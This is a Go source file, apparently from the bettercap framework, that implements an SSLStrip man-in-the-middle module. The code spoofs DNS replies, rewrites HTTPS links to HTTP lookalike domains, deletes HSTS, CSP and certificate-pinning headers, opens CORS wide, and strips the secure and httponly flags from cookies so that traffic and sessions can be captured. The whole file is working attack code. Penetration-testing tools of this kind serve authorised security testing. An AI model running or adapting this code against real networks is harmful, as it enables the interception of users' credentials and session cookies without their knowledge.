package http_proxy

import (
	"io/ioutil"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"strconv"

	"github.com/bettercap/bettercap/log"
	"github.com/bettercap/bettercap/session"
	"github.com/bettercap/bettercap/modules/dns_spoof"

	"github.com/elazarl/goproxy"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	"github.com/evilsocket/islazy/tui"

	"golang.org/x/net/idna"
)

var (
	httpsLinksParser = regexp.MustCompile(`https://[^"'/]+`)
	domainCookieParser = regexp.MustCompile(`; ?(?i)domain=([^;]+)(;|$)`)
	flagsCookieParser = regexp.MustCompile(`; ?(?i)(secure|httponly)`)
)

type SSLStripper struct {
	enabled       bool
	replacements  string
	session       *session.Session
	cookies       *CookieTracker
	hosts         *HostTracker
	handle        *pcap.Handle
	pktSourceChan chan gopacket.Packet
}

func NewSSLStripper(s *session.Session, enabled bool, replacements string) *SSLStripper {
	strip := &SSLStripper{
		enabled: enabled,
		replacements: replacements,
		cookies: NewCookieTracker(),
		hosts:   NewHostTracker(),
		session: s,
		handle:  nil,
	}
	strip.Enable(enabled, replacements)
	return strip
}

func (s *SSLStripper) Enabled() bool {
	return s.enabled
}

func (s *SSLStripper) onPacket(pkt gopacket.Packet) {
	typeEth := pkt.Layer(layers.LayerTypeEthernet)
	typeUDP := pkt.Layer(layers.LayerTypeUDP)
	if typeEth == nil || typeUDP == nil {
		return
	}

	eth := typeEth.(*layers.Ethernet)
	dns, parsed := pkt.Layer(layers.LayerTypeDNS).(*layers.DNS)
	if parsed && dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 && len(dns.Answers) == 0 {
		udp := typeUDP.(*layers.UDP)
		for _, q := range dns.Questions {
			domain := string(q.Name)
			original := s.hosts.Unstrip(domain)
			if original != nil && original.Address != nil {
				redir, who := dns_spoof.DnsReply(s.session, 5, pkt, eth, udp, domain, original.Address, dns, eth.SrcMAC)
				if redir != "" && who != "" {
					log.Debug("[%s] Sending spoofed DNS reply for %s %s to %s.", tui.Green("dns"), tui.Red(domain), tui.Dim(redir), tui.Bold(who))
				}
			}
		}
	}
}

func (s *SSLStripper) Enable(enabled bool, replacements string) {
	s.enabled = enabled
	s.replacements = replacements

	if enabled && s.handle == nil {
		var err error

		if s.handle, err = pcap.OpenLive(s.session.Interface.Name(), 65536, true, pcap.BlockForever); err != nil {
			panic(err)
		}

		if err = s.handle.SetBPFFilter("udp"); err != nil {
			panic(err)
		}

		go func() {
			defer func() {
				s.handle.Close()
				s.handle = nil
			}()

			for s.enabled {
				src := gopacket.NewPacketSource(s.handle, s.handle.LinkType())
				s.pktSourceChan = src.Packets()
				for packet := range s.pktSourceChan {
					if !s.enabled {
						break
					}

					s.onPacket(packet)
				}
			}
		}()
	}
}

func (s *SSLStripper) isContentStrippable(res *http.Response) bool {
	for name, values := range res.Header {
		for _, value := range values {
			if name == "Content-Type" {
				return strings.HasPrefix(value, "text/") || strings.Contains(value, "javascript")
			}
		}
	}

	return false
}

func (s *SSLStripper) processURL(url string) string {
	// first we remove the https schema
	url = url[8:]

	// search the first instance of "/"
	iEndHost := strings.Index(url, "/")
	if iEndHost == -1 {
			iEndHost = len(url)
	}
	// search if port is specified
	iPort := strings.Index(url[:iEndHost], ":")
	if iPort == -1 {
			iPort = iEndHost
	}
	// search for domain's part to replace according to the settings
	replaceto := ""
	for _, r := range strings.Fields(s.replacements) {
		rep := strings.Split(r, ":")
		replacer := regexp.MustCompile("(?i)^" + strings.ReplaceAll(regexp.QuoteMeta(rep[0]), "\\*", "(.+)") + "$") //allow using * to designate any existing character + case insensitive
		if replacer.MatchString(url[:iPort]) {
			replacement := ""
			sreplacement := strings.Split(rep[1], "*")
			for i := range sreplacement {
				replacement += sreplacement[i]
				if i+1 < len(sreplacement) {
					replacement += "${" + strconv.Itoa(i+1) + "}"
				}
			}
			replaceto = replacer.ReplaceAllString(url[:iPort], replacement)
			break
		}
	}
	if len(replaceto) != 0 {
		// replace domain according to the settings & strip HTTPS port (if any)
		url = replaceto + url[iEndHost:]
	} else {
		// double the last TLD's character & strip HTTPS port (if any)
		url = url[:iPort] + string(url[iPort-1]) + url[iEndHost:]
	}

	// finally we add the http schema
	url = "http://" + url

	return url
}

// sslstrip preprocessing, takes care of:
//
// - handling stripped domains
// - making unknown session cookies expire
func (s *SSLStripper) Preprocess(req *http.Request, ctx *goproxy.ProxyCtx) (redir *http.Response) {
	if !s.enabled {
		return
	}

	// handle stripped domains
	original := s.hosts.Unstrip(req.Host)
	if original != nil {
		log.Info("[%s] Replacing host %s with %s in request from %s and transmitting HTTPS", tui.Green("sslstrip"), tui.Bold(req.Host), tui.Yellow(original.Hostname), req.RemoteAddr)
		req.Host = original.Hostname
		req.URL.Host = original.Hostname
		req.Header.Set("Host", original.Hostname)
		req.URL.Scheme = "https"
	}

	if !s.cookies.IsClean(req) {
		// check if we need to redirect the user in order
		// to make unknown session cookies expire
		log.Info("[%s] Sending expired cookies for %s to %s", tui.Green("sslstrip"), tui.Yellow(req.Host), req.RemoteAddr)
		s.cookies.Track(req)
		redir = s.cookies.Expire(req)
	}

	return
}

func (s *SSLStripper) fixCookies(res *http.Response) {
	origHost := res.Request.URL.Hostname()
	strippedHost := s.hosts.Strip(origHost)

	if strippedHost != nil && strippedHost.Hostname != origHost && res.Header["Set-Cookie"] != nil {
		strippedParts := strings.Split(strippedHost.Hostname, ".")
		if len(strippedParts) > 1 {
			log.Info("[%s] Fixing cookies on %s", tui.Green("sslstrip"),tui.Bold(strippedHost.Hostname))
			cookies := make([]string, len(res.Header["Set-Cookie"]))
			// replace domain and strip "secure" flag for each cookie
			for i, cookie := range res.Header["Set-Cookie"] {
				strippedDomain := ""
				if domainCookieParser.MatchString(cookie) {
					cookieSubmatch := domainCookieParser.FindStringSubmatchIndex(cookie)
					domainIndex := [2]int{cookieSubmatch[len(cookieSubmatch)-4], cookieSubmatch[len(cookieSubmatch)-3]}
					// domain name could be splited to include any subdomain
					splittedDomain := strings.Split(cookie[domainIndex[0]:domainIndex[1]], ".")
					for i := range splittedDomain {
						if len(splittedDomain[len(splittedDomain)-(i+1)]) != 0 {
							strippedDomain = "." + strippedParts[len(strippedParts)-(i+1)] + strippedDomain
						}
					}
					if string(cookie[domainIndex[0]]) != "." {
						strippedDomain = strippedDomain[1:]
					} else if len(strippedDomain) == 0 {
						strippedDomain = "."
					}
					cookie = cookie[:domainIndex[0]] + strippedDomain + cookie[domainIndex[1]:]
				}
				cookies[i] = flagsCookieParser.ReplaceAllString(cookie, "")
			}
			res.Header["Set-Cookie"] = cookies
			s.cookies.Track(res.Request)
		}
	}
}

func (s *SSLStripper) fixResponseHeaders(res *http.Response) {
	res.Header.Del("Content-Security-Policy-Report-Only")
	res.Header.Del("Content-Security-Policy")
	res.Header.Del("Strict-Transport-Security")
	res.Header.Del("Public-Key-Pins")
	res.Header.Del("Public-Key-Pins-Report-Only")
	res.Header.Del("X-Frame-Options")
	res.Header.Del("X-Content-Type-Options")
	res.Header.Del("X-WebKit-CSP")
	res.Header.Del("X-Content-Security-Policy")
	res.Header.Del("X-Download-Options")
	res.Header.Del("X-Permitted-Cross-Domain-Policies")
	res.Header.Del("X-Xss-Protection")
	res.Header.Set("Allow-Access-From-Same-Origin", "*")
	res.Header.Set("Access-Control-Allow-Origin", "*")
	res.Header.Set("Access-Control-Allow-Methods", "*")
	res.Header.Set("Access-Control-Allow-Headers", "*")
}

func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
	if !s.enabled {
		return
	}

	s.fixResponseHeaders(res)

	orig := res.Request.URL
	origHost := orig.Hostname()

	// is the server redirecting us?
	if res.StatusCode != 200 {
		// extract Location header
		if location, err := res.Location(); location != nil && err == nil {
			newHost := location.Host
			newURL := location.String()

			// are we getting redirected to https?
			if location.Scheme == "https" {

				log.Info("[%s] Got redirection from HTTP to HTTPS: %s -> %s", tui.Green("sslstrip"), tui.Yellow("http://"+origHost), tui.Bold("https://"+newHost))

				// strip the URL down to an alternative HTTP version and save it to an ASCII Internationalized Domain Name
				strippedURL := s.processURL(newURL)
				parsed, _ := url.Parse(strippedURL)
				hostStripped := parsed.Hostname()
				hostStripped, _ = idna.ToASCII(hostStripped)
				s.hosts.Track(newHost, hostStripped)

				res.Header.Set("Location", strippedURL)
			}
		}
	}

	// if we have a text or html content type, fetch the body
	// and perform sslstripping
	if s.isContentStrippable(res) {
		raw, err := ioutil.ReadAll(res.Body)
		if err != nil {
			log.Error("Could not read response body: %s", err)
			return
		}

		body := string(raw)
		urls := make(map[string]string)
		matches := httpsLinksParser.FindAllString(body, -1)
		for _, u := range matches {
			// make sure we only strip valid URLs
			if parsed, _ := url.Parse(u); parsed != nil {
				// strip the URL down to an alternative HTTP version
				urls[u] = s.processURL(u)
			}
		}

		nurls := len(urls)
		if nurls > 0 {
			plural := "s"
			if nurls == 1 {
				plural = ""
			}
			log.Info("[%s] Stripping %d SSL link%s from %s", tui.Green("sslstrip"), nurls, plural, tui.Bold(res.Request.Host))
		}

		for u, stripped := range urls {
			log.Debug("Stripping url %s to %s", tui.Bold(u), tui.Yellow(stripped))

			body = strings.Replace(body, u, stripped, -1)

			// save stripped host to an ASCII Internationalized Domain Name
			parsed, _ := url.Parse(u)
			hostOriginal := parsed.Hostname()
			parsed, _ = url.Parse(stripped)
			hostStripped := parsed.Hostname()
			hostStripped, _ = idna.ToASCII(hostStripped)
			s.hosts.Track(hostOriginal, hostStripped)
		}

		res.Header.Set("Content-Length", strconv.Itoa(len(body)))

		// fix cookies domain + strip "secure" + "httponly" flags
		s.fixCookies(res)

		// reset the response body to the original unread state
		// but with just a string reader, this way further calls
		// to ioutil.ReadAll(res.Body) will just return the content
		// we stripped without downloading anything again.
		res.Body = ioutil.NopCloser(strings.NewReader(body))
	}
}
